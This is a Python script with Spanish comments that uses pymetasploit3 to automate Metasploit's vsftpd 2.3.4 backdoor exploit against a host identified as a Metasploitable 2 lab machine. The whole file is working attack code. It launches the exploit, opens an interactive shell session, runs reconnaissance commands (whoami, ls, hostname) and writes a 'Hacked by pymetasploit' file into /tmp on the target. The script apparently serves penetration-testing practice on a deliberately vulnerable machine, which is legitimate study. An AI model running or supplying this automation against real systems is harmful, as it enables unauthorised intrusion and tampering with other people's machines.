from pymetasploit3.msfrpc import MsfRpcClient
import time


def connect_to_metasploit(password: str) -> MsfRpcClient:
    """
    Intenta conectar a Metasploit usando la API de pymetasploit3.

    Args:
        password (str): La contraseña de msfrpcd.

    Returns:
        MsfRpcClient: Una instancia conectada al cliente de Metasploit.
    """
    try:
        client = MsfRpcClient(password)
        print("Conectado a Metasploit exitosamente.")
        return client
    except Exception as e:
        print(f"No se pudo conectar a Metasploit: {e}")
        return None


def run_exploit(client: MsfRpcClient, rhost: str) -> None:
    """
    Ejecuta el exploit vsftpd 2.3.4 en la máquina víctima.

    Args:
        client (MsfRpcClient): El cliente conectado de Metasploit.
        rhost (str): La dirección IP de la máquina víctima.
    """
    try:
        # Seleccionar el exploit
        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = rhost
        print(f"Exploit configurado para {rhost}")

        # Seleccionar el payload
        payload = client.modules.use('payload', 'cmd/unix/interact')
        print("Payload configurado")

        # Ejecutar el exploit
        exploit.execute(payload=payload)
        print("Ejecutando el exploit...")
        
        # Esperar a que se abra una sesión
        time.sleep(10)

        # Verificar si se ha abierto una sesión
        if client.sessions.list:
            print("Explotación exitosa. Sesiones activas:")
            for session_id, session_info in client.sessions.list.items():
                print(f"ID de sesión: {session_id}, Información: {session_info}")
                # Ejecutar varios comandos en la sesión abierta
                session = client.sessions.session(session_id)
                
                # Comando 1: Ver el usuario actual
                session.write('whoami')
                time.sleep(1)
                print(f"Usuario actual:\n{session.read()}")

                # Comando 2: Listar archivos en la carpeta actual
                session.write('ls')
                time.sleep(1)
                print(f"Archivos en el directorio actual:\n{session.read()}")

                # Comando 3: Obtener el hostname de la máquina víctima
                session.write('hostname')
                time.sleep(1)
                print(f"Hostname de la máquina:\n{session.read()}")

                # Comando 4: Crear un archivo en la máquina víctima
                session.write('echo "Hacked by pymetasploit" > /tmp/hacked.txt')
                time.sleep(1)
                print("Archivo 'hacked.txt' creado en /tmp.")

        else:
            print("No se pudo obtener una sesión.")
    except Exception as e:
        print(f"Error al ejecutar el exploit: {e}")


def main():
    # Conectar a Metasploit
    client = connect_to_metasploit('password')  # Usa la misma contraseña que en msfrpcd

    # Verificar que la conexión fue exitosa
    if client:
        # IP de la máquina Metasploitable 2
        rhost = '192.168.0.110'
        
        # Ejecutar el exploit
        run_exploit(client, rhost)
    else:
        print("No se puede proceder sin una conexión a Metasploit.")


if __name__ == "__main__":
    main()

